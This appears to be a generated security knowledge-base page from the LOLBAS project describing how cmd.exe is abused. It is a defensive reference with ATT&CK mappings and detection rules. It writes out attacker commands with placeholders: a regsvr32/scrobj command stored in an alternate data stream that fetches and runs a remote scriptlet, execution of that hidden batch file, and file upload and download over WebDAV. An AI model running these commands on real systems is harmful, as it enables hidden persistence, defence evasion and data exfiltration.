---
title: "Cmd.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Cmd.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Cmd.exe"
functions:
  - "ADS"
  - "Download"
  - "Upload"
attack_technique_ids:
  - "T1564.004"
  - "T1059.003"
  - "T1105"
  - "T1048.003"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

The command-line interpreter in Windows

## Paths

- `C:\Windows\System32\cmd.exe`
- `C:\Windows\SysWOW64\cmd.exe`

## Commands

### 1. ADS

Add content to an Alternate Data Stream (ADS).

```cmd
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
```

- Use Case: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]

### 2. ADS

Execute payload.bat stored in an Alternate Data Stream (ADS).

```cmd
cmd.exe - < {PATH}:payload.bat
```

- Use Case: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1059-command_and_scripting_interpreter#^t1059003-windows-command-shell|T1059.003: Windows Command Shell]]

### 3. Download

Downloads a specified file from a WebDAV server to the target file.

```cmd
type {PATH_SMB} > {PATH_ABSOLUTE}
```

- Use Case: Download/copy a file from a WebDAV server
- Privileges: User
- Operating System: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

### 4. Upload

Uploads a specified file to a WebDAV server.

```cmd
type {PATH_ABSOLUTE} > {PATH_SMB}
```

- Use Case: Upload a file to a WebDAV server
- Privileges: User
- Operating System: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol#^t1048003-exfiltration-over-unencrypted-non-c2-protocol|T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml
- Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml
- IOC: cmd.exe executing files from alternate data streams.
- IOC: cmd.exe creating/modifying file contents in an alternate data stream.

## Resources

- {'Link': 'https://twitter.com/yeyint_mth/status/1143824979139579904'}
- {'Link': 'https://twitter.com/Mr_0rng/status/1601408154780446721'}
- {'Link': 'https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22'}
- {'Link': 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type'}

## Acknowledgements

- {'Person': 'r0lan', 'Handle': '@yeyint_mth'}
- {'Person': 'Mr.0range', 'Handle': '@mr_0rng'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml)
